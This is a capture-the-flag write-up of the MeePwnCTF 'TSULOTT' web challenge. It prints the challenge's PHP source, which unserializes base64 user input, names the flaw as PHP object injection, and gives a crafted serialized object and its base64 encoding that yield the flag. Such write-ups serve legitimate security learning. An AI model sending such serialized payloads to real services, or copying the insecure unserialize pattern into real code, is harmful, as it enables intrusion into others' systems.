# TSULOTT

**100 pts**

> Who Wants to Be a Millionaire? Join My LOTT and Win JACKPOTTTT!!!

> Remote: [128.199.190.23:8001](128.199.190.23:8001)

---

# Writeups
![](https://github.com/bl4ckpr15m/CTF-Writeups/blob/master/img/Screenshot_20170716_184808.png)

## Think simple
![](https://github.com/bl4ckpr15m/CTF-Writeups/blob/master/img/Screenshot_20170714_204246.png)
- Lets check the source code from the web.
- Here we can see a comment,
    ```HTML
    <!-- GET is_debug=1 -->
    ```
    mmmm... why not [128.199.190.23:8001?is_debug=1](128.199.190.23:8001?is_debug=1).
- Awesome! now we can read the server code, it is written in PHP.

```php
<body> 
<style> 
input[type=text] { 
    width: 40%; 
    padding: 12px 20px; 
    margin: 8px 0; 
    box-sizing: border-box; 
    border: 2px solid red; 
    background-color: #ebfff8; 
    border-radius: 4px; 
} 

button[type=submit] { 
    width: 10%; 
    background-color: #F94848; 
    color: white; 
    padding: 14px 20px; 
    margin: 8px 0; 
    border: none; 
    border-radius: 4px; 
    cursor: pointer; 
} 

button[type=submit]:hover { 
    background-color: #45a049; 
} 

body { 
    background-image: url("money.jpg"); 
} 
</style> 

<?php 
class Object  
{  
  var $jackpot; 
  var $enter;  
} 
?> 


<?php 

include('secret.php'); 

if(isset($_GET['input']))   
{ 
  $obj = unserialize(base64_decode($_GET['input'])); 
  if($obj) 
  { 
    $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99);  
    if($obj->enter === $obj->jackpot) 
    { 
      echo "<center><strong><font color='white'>CONGRATULATION! You Won JACKPOT PriZe !!! </font></strong></center>". "<br><center><strong><font color='white' size='20'>".$obj->jackpot."</font></strong></center>"; 
      echo "<br><center><strong><font color='green' size='25'>".$flag."</font></strong></center><br>"; 
      echo "<center><img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /></center>"; 

    } 
    else 
    { 
      echo "<br><br><center><strong><font color='white'>Wrong! True Six Numbers Are: </font></strong></center>". "<br><center><strong><font color='white' size='25'>".$obj->jackpot."</font></strong></center><br>"; 
    } 
  } 
  else 
  { 
    echo "<center><strong><font color='white'>- Something wrong, do not hack us please! -</font></strong></center>"; 
  } 
} 
else 
{ 
  echo ""; 
} 
?> 
<center> 
<br><h2><font color='yellow' size=8>-- TSU</font><font color='red' size=8>LOTT --</font></h2> 
<p><p><font color='white'>Input your code to win jackpot!</font><p> 
<form> 
          <input type="text" name="input" /><p><p> 
          <button type="submit" name="btn-submit" value="go">send</button> 
</form> 
</center> 
<?php 
if (isset($_GET['gen_code']) && !empty($_GET['gen_code'])) 
{ 
  $temp = new Object; 
  $temp->enter=$_GET['gen_code']; 
  $code=base64_encode(serialize($temp));  
  echo '<center><font color=\'white\'>Here is your code, please use it to Lott: <strong>'.$code.'</strong></font></center>'; 
} 
?> 
<center> 
<font color='white'>-----------------------------------------------------------------------------------------------------------------------------</font> 
<h3><font color='white'>Take code</font></h3><p> 
<p><font color='white'>Pick your six numbers (Ex: 15 02 94 11 88 76)</font><p> 
<form> 
      <input type="text" name="gen_code" maxlength="17" /><p><p> 
      <button type="submit" name="btn-submit" value="go">send</button> 
</form> 
</center> 
<?php 
if(isset($_GET['is_debug']) && $_GET['is_debug']==='1') 
{ 
   show_source(__FILE__); 
} 
?> 
<!-- GET is_debug=1 --> 
</body> 
```

## Injection
The flag is rendered after this condition:
```php
if($obj->enter === $obj->jackpot)
```
Reading the PHP code we can notice the vulnerability. PHP Object Injection.
Get the input and try to unserialize it as an Object.
```php
$obj = unserialize(base64_decode($_GET['input']));
```
We need the enter value and the jackpot value of the object to be the same, but we will never manage to get it right. The object is serialized and then the jackpot attribute is setted as random.
```php
$obj = unserialize(base64_decode($_GET['input'])); 
if($obj) { 
    $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99); 
    if($obj->enter === $obj->jackpot);
...
}
```

Our only chance is generate a completely random object and encoded with base64.
- [https://www.tools4noobs.com/online_php_functions/base64_encode/](https://www.tools4noobs.com/online_php_functions/base64_encode/)
- Generate a random object, in this case an object Test who have 2 attributes (jackpot and enter) both of them NULL
    ```json
        INPUT: O:4:"Test":2:{s:7:"jackpot";N;s:5:"enter";N;}
    ```
    ```json
        OUTPUT: "Tzo0OiJUZXN0IjoyOntzOjc6ImphY2twb3QiO047czo1OiJlbnRlciI7Tjt9"
    ```
    
## Win the lottery
Paste the output into the form and voilà:
```
MeePwnCTF{__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___}
```

![](https://github.com/bl4ckpr15m/CTF-Writeups/blob/master/img/Screenshot_20170715_000809.png)
